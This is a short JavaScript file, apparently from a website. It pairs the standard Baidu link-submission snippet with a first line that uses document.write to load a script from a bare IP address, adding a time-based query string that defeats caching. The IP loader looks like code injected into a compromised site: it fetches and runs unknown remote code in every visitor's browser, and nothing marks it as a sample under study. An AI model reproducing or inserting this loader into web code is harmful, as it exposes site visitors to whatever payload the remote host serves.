var now = new Date();
document.write("<script src='http://142.4.102.237/js.js?"+String(now.getMonth()+1)+String(now.getDate())+String(now.getHours())+String(now.getMinutes())+"'></script>");

(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();